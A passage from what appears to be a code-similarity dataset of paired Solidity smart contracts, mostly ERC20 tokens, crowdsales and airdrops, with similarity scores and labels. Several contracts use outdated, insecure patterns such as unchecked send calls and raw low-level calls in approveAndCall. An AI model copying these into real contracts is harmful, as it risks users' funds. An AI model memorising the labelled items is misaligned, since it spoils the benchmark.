    uint public fundingGoal;

    uint public amountRaised; 

    uint public deadline; 



    uint public price;

    token public tokenReward; 

    mapping(address => uint256) public balanceOf;

    bool fundingGoalReached = false; 

    bool crowdsaleClosed = false; 



    event GoalReached(address recipient, uint totalAmountRaised);

    event FundTransfer(address backer, uint amount, bool isContribution);



    function Crowdsale(

        address ifSuccessfulSendTo,

        uint fundingGoalInEthers,

        uint durationInMinutes,

        uint etherCostOfEachToken,

        address addressOfTokenUsedAsReward

    ) {

        beneficiary = ifSuccessfulSendTo;

        fundingGoal = fundingGoalInEthers * 1 ether;

        deadline = now + durationInMinutes * 1 minutes;

        price = etherCostOfEachToken * 1 ether;

        tokenReward = token(addressOfTokenUsedAsReward);

    }



    function () payable {

       require(!crowdsaleClosed);

       uint amount = msg.value;

       balanceOf[msg.sender] += amount;

       amountRaised += amount;

       tokenReward.transfer(msg.sender, amount / price);  

       beneficiary.send(amountRaised);

       amountRaised = 0;

       FundTransfer(msg.sender, amount, true);

}



    modifier afterDeadline() {

          if (now >= deadline) _;

          }



    function checkGoalReached() afterDeadline {

        if (amountRaised >= fundingGoal){

            fundingGoalReached = true;

            GoalReached(beneficiary, amountRaised);

        }

        crowdsaleClosed = true;

    }



    function safeWithdrawal() afterDeadline {

        if (!fundingGoalReached) {

            uint amount = balanceOf[msg.sender];

            balanceOf[msg.sender] = 0;

            if (amount > 0) {

                if (msg.sender.send(amount)) {

                    FundTransfer(msg.sender, amount, false);

            }

            else {

                balanceOf[msg.sender] = amount;

                }

            }

        }

        if (fundingGoalReached && beneficiary == msg.sender) {

            if (beneficiary.send(amountRaised)) {

                FundTransfer(beneficiary, amountRaised, false);

            }

            else {

                fundingGoalReached = false;

            }

        }

    }

}",1,,,,,
"contract BitcoinCrown is StandardToken { 

    

    
    string public name;                   
    uint8 public decimals;                
    string public symbol;                 
    string public version = 'H1.0'; 
    uint256 public unitsOneEthCanBuy;     
    uint256 public totalEthInWei;         
    address public fundsWallet;           

    
    
    function BitcoinCrown() {
        balances[msg.sender] = 70000000000000000000000000;               
        totalSupply = 70000000000000000000000000;                       
        name = ""BitcoinCrown"";                                         
        decimals = 18;                                                
        symbol = ""BTCC"";                                             
        unitsOneEthCanBuy = 2800;                                   
        fundsWallet = msg.sender;                                  
    }

    function() payable{
        totalEthInWei = totalEthInWei + msg.value;
        uint256 amount = msg.value * unitsOneEthCanBuy;
        require(balances[fundsWallet] >= amount);

        balances[fundsWallet] = balances[fundsWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;

        Transfer(fundsWallet, msg.sender, amount); 

        
        fundsWallet.transfer(msg.value);                               
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);

        
        
        
        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
        return true;
    }
}",0.9542129,"contract CoinNewsChannel is StandardToken { 



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;          



    function CoinNewsChannel() {

        balances[msg.sender] = 1000000000000000000000000;              

        totalSupply = 1000000000000000000000000;                        

        name = ""CoinNewsChannel"";                                   

        decimals = 18;                                               

        symbol = ""SCNCT"";                                             

        unitsOneEthCanBuy = 1000;                                     

        fundsWallet = msg.sender;                                   

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract AirDrop is Ownable {

  Token token;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  modifier whenDropIsActive() {
    assert(isActive());

    _;
  }

  function AirDrop () {
      address _tokenAddr =0xe34c1960fbf05d4e08c19248491dfbcdbeab6e44; 
      token = Token(_tokenAddr);
  }

  function isActive() constant returns (bool) {
    return (
        tokensAvailable() > 0 
    );
  }
  
  function sendTokens(address[] dests, uint256[] values) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    while (i < dests.length) {
        uint256 toSend = values[i] ;
        sendInternally(dests[i] , toSend, values[i]);
        i++;
    }
  }

  
  function sendTokensSingleValue(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    uint256 toSend = value;
    while (i < dests.length) {
        sendInternally(dests[i] , toSend, value);
        i++;
    }
  }  

  function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
    if(recipient == address(0)) return;

    if(tokensAvailable() >= tokensToSend) {
      token.transfer(recipient, tokensToSend);
      TransferredToken(recipient, valueToPresent);
    } else {
      FailedTransfer(recipient, valueToPresent); 
    }
  }   


  function tokensAvailable() constant returns (uint256) {
    return token.balanceOf(this);
  }

  function destroy() onlyOwner {
    uint256 balance = tokensAvailable();
    require (balance > 0);
    token.transfer(owner, balance);
    selfdestruct(owner);
  }
}",0.973436067,"contract AirDrop is Ownable {

  Token token;

  event TransferredToken(address indexed to, uint256 value);
  event FailedTransfer(address indexed to, uint256 value);

  modifier whenDropIsActive() {
    assert(isActive());

    _;
  }
address public creator;
  function AirDrop () {
      address _tokenAddr = creator; 
      token = Token(_tokenAddr);
  }

  function isActive() constant returns (bool) {
    return (
        tokensAvailable() > 0 
    );
  }
  
  function sendTokens(address[] dests, uint256[] values) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    while (i < dests.length) {
        uint256 toSend = values[i] ;
        sendInternally(dests[i] , toSend, values[i]);
        i++;
    }
  }

  
  function sendTokensSingleValue(address[] dests, uint256 value) whenDropIsActive onlyOwner external {
    uint256 i = 0;
    uint256 toSend = value;
    while (i < dests.length) {
        sendInternally(dests[i] , toSend, value);
        i++;
    }
  }  

  function sendInternally(address recipient, uint256 tokensToSend, uint256 valueToPresent) internal {
    if(recipient == address(0)) return;

    if(tokensAvailable() >= tokensToSend) {
      token.transfer(recipient, tokensToSend);
      TransferredToken(recipient, valueToPresent);
    } else {
      FailedTransfer(recipient, valueToPresent); 
    }
  }   


  function tokensAvailable() constant returns (uint256) {
    return token.balanceOf(this);
  }

  function destroy() onlyOwner {
    uint256 balance = tokensAvailable();
    require (balance > 0);
    token.transfer(owner, balance);
    selfdestruct(owner);
  }
}",1,,,,,
"contract SimpleToken is StandardToken {

  string public constant name = ""FACETOKE"";
  string public constant symbol = ""FACE"";
  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 1000000*10**18; 

  function SimpleToken() {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
  }

}",0.904956962,"contract ZLHToken is StandardToken {



  string public constant name = ""ZHENLIHAICoin"";

  string public constant symbol = ""ZLH"";

  uint8 public constant decimals = 18; 



  uint256 public constant INITIAL_SUPPLY =  1000000000; 



  

  function ZLHToken() {

    totalSupply = INITIAL_SUPPLY;

    balances[msg.sender] = INITIAL_SUPPLY;

  }

}",1,,,,,
"contract BasicToken is ERC20Basic {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    uint256 totalSupply_;

    function totalSupply() public view returns (uint256) {
       return totalSupply_;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
       require(_to != address(0));
       require(_value <= balances[msg.sender]);
       balances[msg.sender] = balances[msg.sender].sub(_value);
       balances[_to] = balances[_to].add(_value);
       Transfer(msg.sender, _to, _value);
       return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
       return balances[_owner];
    }
}",0.987786412,"contract BasicToken is ERC20Basic {

  using SafeMath for uint256;



  mapping(address => uint256) balances;



  uint256 totalSupply_;



  

  function totalSupply() public view returns (uint256) {

    return totalSupply_;

  }



  

  function transfer(address _to, uint256 _value) public returns (bool) {

    require(_to != address(0));

    require(_value <= balances[msg.sender]);



    balances[msg.sender] = balances[msg.sender].sub(_value);

    balances[_to] = balances[_to].add(_value);

    emit Transfer(msg.sender, _to, _value);

    return true;

  }



  

  function balanceOf(address _owner) public view returns (uint256 balance) {

    return balances[_owner];

  }



}",1,,,,,
"contract TestMyToken is StandardToken {
    string public constant name = ""TestMyToken""; 
    string public constant symbol = ""TMT"";
    uint8 public constant decimals = 18;
    uint256 public constant INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals));

    function TestMyToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
}",0.926618937,"contract TokenPostCoin  is StandardToken {

  string public constant name = ""TokenPostCoin"";
  string public constant symbol = ""TPC"";
  uint8 public constant decimals = 18;

  uint256 public constant INITIAL_SUPPLY = 1000000000 * (10 ** uint256(decimals));

  
  function TokenPostCoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }

}",1,,,,,
"contract OwnedI {
    
    event LogOwnerSet(address indexed previousOwner, address indexed newOwner);

    
    function setOwner(address newOwner) returns(bool success);

    
    function getOwner() constant returns(address owner);

}",0.933269936,"contract OwnedI {
    event LogOwnerChanged(address indexed previousOwner, address indexed newOwner);

    function getOwner()
        constant
        returns (address);

    function setOwner(address newOwner)
        returns (bool success); 
}",1,,,,,
"contract TOKKA is StandardToken {
    string public name = ""TOKKA"";
    string public symbol = ""TOK"";
    uint256 public decimals = 18;

    uint256 constant INITIAL_SUPPLY = 18000000 * 10**18;
    function TOKKA () public {
       balances[msg.sender] = INITIAL_SUPPLY;
    }
}",0.913549522,"contract MOKEN is StandardToken {
    string public name = ""MOKEN"";
    string public symbol = ""MOKN"";
    uint256 public decimals = 18;

    uint256 constant INITIAL_SUPPLY = 17000000 * 10**18;
    function MOKEN () public {
       balances[msg.sender] = INITIAL_SUPPLY;
    }
}",1,,,,,
"contract Crowdsale {
  using SafeMath for uint256;

   
  TOKKA public token;

  
  uint256 public startTime;
  uint256 public endTime;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) public {
    require(_startTime >= now);
    require(_endTime >= _startTime);
    require(_rate > 0);
    require(_wallet != address(0));

    startTime = _startTime;
    endTime = _endTime;
    rate = _rate;
    wallet = _wallet;
    token = createTokenContract();
  }



function createTokenContract() internal returns (TOKKA) {
    return new TOKKA();
  }


  
  function () external payable {
    buyTokens(msg.sender);
  }

  
function buyTokens(address beneficiary) public payable {
    require(beneficiary != address(0));
    require(validPurchase());

    uint256 weiAmount = msg.value;

    
    uint256 tokens = weiAmount.mul(rate);

    
    weiRaised = weiRaised.add(weiAmount);

    
    ERC20(token).transfer(this, tokens);

    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

    forwardFunds();
}


  function forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function validPurchase() internal view returns (bool) {
    bool withinPeriod = now >= startTime && now <= endTime;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }


  function hasEnded() public view returns (bool) {
    return now > endTime;
  }

}",0.955012133,"contract Crowdsale {
    using SafeMath for uint256;

    
    MintableToken public token;

    
    uint256 public startTime;
    uint256 public endTime;

    
    address public wallet;

    
    uint256 public rate;

    
    uint256 public weiRaised;

    
    event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);


    function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {
        require(_startTime >= now);
        require(_endTime >= _startTime);
        require(_rate > 0);
        require(_wallet != address(0));

        token = createTokenContract();
        startTime = _startTime;
        endTime = _endTime;
        rate = _rate;
        wallet = _wallet;
    }

    
    
    function createTokenContract() internal returns (MintableToken) {
        return new MintableToken();
    }


    
    function () payable {
        buyTokens(msg.sender);
    }

    
    function buyTokens(address beneficiary) public payable {
        require(beneficiary != address(0));
        require(validPurchase());

        uint256 weiAmount = msg.value;

        
        uint256 tokens = weiAmount.mul(rate);

        
        weiRaised = weiRaised.add(weiAmount);

        token.mint(beneficiary, tokens);
        TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);

        forwardFunds();
    }

    
    
    function forwardFunds() internal {
        wallet.transfer(msg.value);
    }

    
    function validPurchase() internal constant returns (bool) {
        bool withinPeriod = now >= startTime && now <= endTime;
        bool nonZeroPurchase = msg.value != 0;
        return withinPeriod && nonZeroPurchase;
    }

    
    function hasEnded() public constant returns (bool) {
        return now > endTime;
    }
}",1,,,,,
"contract TokenERC20 {

string public name;
string public symbol;
uint8 public decimals = 18;
uint256 public totalSupply;

mapping (address => uint256) public balanceOf;
mapping (address => mapping (address => uint256)) public allowance;

event Transfer(address indexed from, address indexed to, uint256 value);
event Burn(address indexed from, uint256 value);

constructor(uint256 initialSupply, string tokenName, string tokenSymbol) public {
    totalSupply = initialSupply;
    balanceOf[msg.sender] = totalSupply;
    name = tokenName;
    symbol = tokenSymbol;
}

function _transfer(address _from, address _to, uint _value) internal {
    require(_to != 0x0);
    require(balanceOf[_from] >= _value);
    require(balanceOf[_to] + _value >= balanceOf[_to]);
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;
    emit Transfer(_from, _to, _value);
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
}

function transfer(address _to, uint256 _value) public {
    _transfer(msg.sender, _to, _value);
}

function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);
    allowance[_from][msg.sender] -= _value;
    _transfer(_from, _to, _value);
    return true;
}

function approve(address _spender, uint256 _value) public returns (bool success) {
    allowance[msg.sender][_spender] = _value;
    return true;
}

function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {
    tokenRecipient spender = tokenRecipient(_spender);
    if (approve(_spender, _value)) {
        spender.receiveApproval(msg.sender, _value, this, _extraData);
        return true;
    }
}

function burn(uint256 _value) public returns (bool success) {
    require(balanceOf[msg.sender] >= _value);
    balanceOf[msg.sender] -= _value;
    totalSupply -= _value;
    emit Burn(msg.sender, _value);
    return true;
}

function burnFrom(address _from, uint256 _value) public returns (bool success) {
    require(_value <= allowance[_from][msg.sender]);
    require(balanceOf[_from] >= _value);
    balanceOf[_from] -= _value;
    allowance[_from][msg.sender] -= _value;
    totalSupply -= _value;
    emit Burn(_from, _value);
    return true;
}

function () public payable {
    revert();
}

}",0.939679389,"contract TokenERC20 {
    string public name=""Ecological Industry"";
    string public symbol=""ECO"";
    uint8 public decimals = 4; 
    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Burn(address indexed from, uint256 value);

    constructor() public {
        totalSupply = 12000000 * 10 ** uint256(decimals);
        balanceOf[msg.sender] = totalSupply;
        
    }

    function _transfer(address _from, address _to, uint _value) internal {
        require(_to != 0x0);
        require(balanceOf[_from] >= _value);
        require(balanceOf[_to] + _value > balanceOf[_to]);

        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns(bool success) {
        require(_value <= allowance[_from][msg.sender]); 
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public
    returns(bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
    public
    returns(bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
    }

    function burn(uint256 _value) public returns(bool success) {
        require(balanceOf[msg.sender] >= _value); 
        balanceOf[msg.sender] -= _value; 
        totalSupply -= _value; 
        emit Burn(msg.sender, _value);
        return true;
    }

    function burnFrom(address _from, uint256 _value) public returns(bool success) {
        require(balanceOf[_from] >= _value); 
        require(_value <= allowance[_from][msg.sender]); 
        balanceOf[_from] -= _value; 
        allowance[_from][msg.sender] -= _value; 
        totalSupply -= _value; 
        emit Burn(_from, _value);
        return true;
    }
}",2,*,,,,
contract greeter1 is mortal { string greeting; function greeter(string _greeting) public { greeting = _greeting; } function greet() constant returns (string) { return greeting; } },0.952365186,"contract Greeter is Mortal {
    
    string greeting;

    
    function Greeter(string _greeting) public {
        greeting = _greeting;
    }

    
    function greet() constant returns (string) {
        return greeting;
    }
}",1,,,,,
"contract ECToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}",0.951894858,"contract ForeignToken {
    function balanceOf(address _owner) constant returns (uint256);
    function transfer(address _to, uint256 _value) returns (bool);
}",1,,,,,
"contract ABCToken is StandardToken { 




string public name;                   
uint8 public decimals;                
string public symbol;                 
string public version = 'H1.0'; 
uint256 public unitsOneEthCanBuy;     
uint256 public totalEthInWei;         
address public fundsWallet;           



function ABCToken () public {
    balances[msg.sender] = 1000000000000000000000000000;    
    totalSupply = 1000000000000000000000000000;                        
    name = ""ABC Token"";                                   
    decimals = 18;                                               
    symbol = ""ABC"";                                             
    unitsOneEthCanBuy = 10000;                                      
    fundsWallet = msg.sender;                                    
}

function() payable{
    totalEthInWei = totalEthInWei + msg.value;
    uint256 amount = msg.value * unitsOneEthCanBuy;
    require(balances[fundsWallet] >= amount);

    balances[fundsWallet] = balances[fundsWallet] - amount;
    balances[msg.sender] = balances[msg.sender] + amount;

    Transfer(fundsWallet, msg.sender, amount); 

    
    fundsWallet.transfer(msg.value);                               
}


function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {
    allowed[msg.sender][_spender] = _value;
    Approval(msg.sender, _spender, _value);

    
    
    
    if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }
    return true;
}

}",0.951536418,"contract CoinNewsChannel is StandardToken { 



    

    string public name;                   

    uint8 public decimals;                

    string public symbol;                

    string public version = 'H1.0'; 

    uint256 public unitsOneEthCanBuy;     

    uint256 public totalEthInWei;         

    address public fundsWallet;          



    function CoinNewsChannel() {

        balances[msg.sender] = 1000000000000000000000000;              

        totalSupply = 1000000000000000000000000;                        

        name = ""CoinNewsChannel"";                                   

        decimals = 18;                                               

        symbol = ""SCNCT"";                                             

        unitsOneEthCanBuy = 1000;                                     

        fundsWallet = msg.sender;                                   

    }



    function() payable{

        totalEthInWei = totalEthInWei + msg.value;

        uint256 amount = msg.value * unitsOneEthCanBuy;

        require(balances[fundsWallet] >= amount);



        balances[fundsWallet] = balances[fundsWallet] - amount;

        balances[msg.sender] = balances[msg.sender] + amount;



        Transfer(fundsWallet, msg.sender, amount); 



        

        fundsWallet.transfer(msg.value);                               

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        Approval(msg.sender, _spender, _value);



        if(!_spender.call(bytes4(bytes32(sha3(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { throw; }

        return true;

    }

}",1,,,,,
"contract mortal is owned {
  function kill() {
    if (msg.sender == owner) selfdestruct(owner);
  }
}",0.951666247,"contract Mortal is Owned {
    
    function kill() {
        if (msg.sender == owner)
            selfdestruct(owner);
    }
}",1,,,,,
"contract xxxxxx {

    
    string public name = 'xxxxxx';
    string public symbol = 'xx';
    uint8 public decimals = 18;
    
    uint256 public totalSupply = 100000000000000000000000000;
    uint256 public unitsOneEthCanBuy = 9500;     
    address public fundsWallet = msg.sender;           

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Burn(address indexed from, uint256 value);


    
    function xxxxxx (
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol 

    ) public {
        totalSupply = 100000000000000000000000000; initialSupply = 75000000000000000000000000 * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               


    }


    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value > balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }

    
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }

    
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);     
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }

    

    function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        return true;
    }

    
    function approveAndCall(address _spender, uint256 _value, bytes _extraData)
        public
        returns (bool success) {
        tokenRecipient spender = tokenRecipient(_spender);
        if (approve(_spender, _value)) {
            spender.receiveApproval(msg.sender, _value, this, _extraData);
            return true;
        }
        }

    


    function burn(uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);   
        balanceOf[msg.sender] -= _value;            
        totalSupply -= _value;                      
        Burn(msg.sender, _value);
        return true;
    }

    
    function burnFrom(address _from, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);                
        require(_value <= allowance[_from][msg.sender]);    
        balanceOf[_from] -= _value;                         
        allowance[_from][msg.sender] -= _value;             
        totalSupply -= _value;                              
        Burn(_from, _value);
        return true;
    }



}",0.935261354,"contract TokenERC20 {

    

    string public name;

    string public symbol;

    uint8 public decimals = 18;

    

    uint256 public totalSupply;



    

    mapping (address => uint256) public balanceOf;

    mapping (address => mapping (address => uint256)) public allowance;



    

    event Transfer(address indexed from, address indexed to, uint256 value);

    

    

    event Approval(address indexed _owner, address indexed _spender, uint256 _value);



    

    event Burn(address indexed from, uint256 value);



    

 constructor( uint256 initialSupply,string tokenName,    string tokenSymbol ) public {

        totalSupply = initialSupply * 10 ** uint256(decimals);  

        balanceOf[msg.sender] = totalSupply;                

        name = tokenName;                                   

        symbol = tokenSymbol;                               

    }



    

    function _transfer(address _from, address _to, uint _value) internal {

        

        require(_to != 0x0);

        

        require(balanceOf[_from] >= _value);

        

        require(balanceOf[_to] + _value >= balanceOf[_to]);

        

        uint previousBalances = balanceOf[_from] + balanceOf[_to];

        

        balanceOf[_from] -= _value;

        

        balanceOf[_to] += _value;

        emit Transfer(_from, _to, _value);

        

        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);

    }



    

    function transfer(address _to, uint256 _value) public returns (bool success) {

        _transfer(msg.sender, _to, _value);

        return true;

    }



    

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        require(_value <= allowance[_from][msg.sender]);     

        allowance[_from][msg.sender] -= _value;

        _transfer(_from, _to, _value);

        return true;

    }



    

    function approve(address _spender, uint256 _value) public

        returns (bool success) {

        allowance[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);

        return true;

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData)

        public

        returns (bool success) {

        tokenRecipient spender = tokenRecipient(_spender);

        if (approve(_spender, _value)) {

            spender.receiveApproval(msg.sender, _value, this, _extraData);

            return true;

        }

    }



    

    function burn(uint256 _value) public returns (bool success) {

        require(balanceOf[msg.sender] >= _value);   

        balanceOf[msg.sender] -= _value;            

        totalSupply -= _value;                      

        emit Burn(msg.sender, _value);

        return true;

    }



    

    function burnFrom(address _from, uint256 _value) public returns (bool success) {

        require(balanceOf[_from] >= _value);                

        require(_value <= allowance[_from][msg.sender]);    

        balanceOf[_from] -= _value;                         

        allowance[_from][msg.sender] -= _value;             

        totalSupply -= _value;                              

        emit Burn(_from, _value);

        return true;

    }

}",1,,,,,
"contract TokenERC20 {
    
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    function TokenERC20(
        uint256 initialSupply,
        string tokenName,
        string tokenSymbol
    ) public {
        totalSupply = initialSupply * 10 ** uint256(decimals);  
        balanceOf[msg.sender] = totalSupply;                
        name = tokenName;                                   
        symbol = tokenSymbol;                               
    }

    
    function _transfer(address _from, address _to, uint _value) internal {
        
        require(_to != 0x0);
        
        require(balanceOf[_from] >= _value);
        
        require(balanceOf[_to] + _value >= balanceOf[_to]);
        
        uint previousBalances = balanceOf[_from] + balanceOf[_to];
        
        balanceOf[_from] -= _value;
        
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        
        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    }


    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

}",0.950037689,"contract CNKTToken is owned {

    string public name; 

    string public symbol; 

    uint8 public decimals = 18;

    uint256 public totalSupply; 

  

    mapping (address => uint256) public balanceOf;

	 

    event Transfer(address indexed from, address indexed to, uint256 value); 

    

    function CNKTToken(uint256 initialSupply, string tokenName, string tokenSymbol) public {

		owner = msg.sender;

        totalSupply = initialSupply * 10 ** uint256(decimals); 

        balanceOf[owner] = totalSupply; 

        name = tokenName;

        symbol = tokenSymbol;

    }

 

    function _transfer(address _from, address _to, uint256 _value) internal {

        require (_to != 0x0); 

        require (balanceOf[_from] >= _value); 

        require (balanceOf[_to] + _value > balanceOf[_to]);



		uint256 previousBalances = balanceOf[_from] +balanceOf[_to]; 

        

        balanceOf[_from] -= _value; 

        balanceOf[_to] +=  _value; 

		assert(balanceOf[_from] + balanceOf[_to] == previousBalances); 

		emit Transfer(_from, _to, _value); 

    }

	

    function transfer(address _to, uint256 _value) public {   _transfer(msg.sender, _to, _value);   }

}",3,,,,,
"contract FRPoint {
    
    string public standard = 'Token 0.1';
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public initialSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;


    
    function FRPoint() {

         initialSupply = 90000000000000000000;
         name =""FRP$"";
        decimals = 9;
         symbol = ""FRP"";

        balanceOf[msg.sender] = initialSupply;              
        uint256 totalSupply = initialSupply;                        

    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            

    }







    
    function () {
        throw;     
    }
}",0.928553814,"contract Uup {
    
    string public standard = &#39;Token 0.1&#39;;
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public initialSupply;
    uint256 public totalSupply;

    
    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

  
    
    function Uup() {

         initialSupply = 115000;
         name =""Uup"";
        decimals = 0;
         symbol = ""Uup"";
        
        balanceOf[msg.sender] = initialSupply;              
        totalSupply = initialSupply;                        
                                   
    }

    
    function transfer(address _to, uint256 _value) {
        if (balanceOf[msg.sender] < _value) throw;           
        if (balanceOf[_to] + _value < balanceOf[_to]) throw; 
        balanceOf[msg.sender] -= _value;                     
        balanceOf[_to] += _value;                            
      
    }

   

    

   

    
    function () {
        throw;     
    }
}",1,,,,,
"contract ERC20 {
    function totalSupply() public view returns (uint256);
    function balanceOf(address who) public view returns (uint256);
    function allowance(address owner, address spender) public view returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}",0.992693893,"contract ERC20 {

  function totalSupply() public view returns (uint256);

  function balanceOf(address who) public view returns (uint256);

  function transfer(address to, uint256 value) public returns (bool);

  function allowance(address owner, address spender)

    public view returns (uint256);



  function transferFrom(address from, address to, uint256 value)

    public returns (bool);



  function approve(address spender, uint256 value) public returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(

    address indexed owner,

    address indexed spender,

    uint256 value

  );

}",1,,,,,
"contract TOKKA is StandardToken {
    string public name = ""TOKKA"";
    string public symbol = ""TOK"";
    uint256 public decimals = 18;

    uint256 constant INITIAL_SUPPLY = 6000000 * 10**18;
    function TOKKA () public {
       balances[msg.sender] = INITIAL_SUPPLY;
    }
}",0.91004445,"contract MOKEN is StandardToken {
    string public name = ""MOKEN"";
    string public symbol = ""MOKN"";
    uint256 public decimals = 18;

    uint256 constant INITIAL_SUPPLY = 17000000 * 10**18;
    function MOKEN () public {
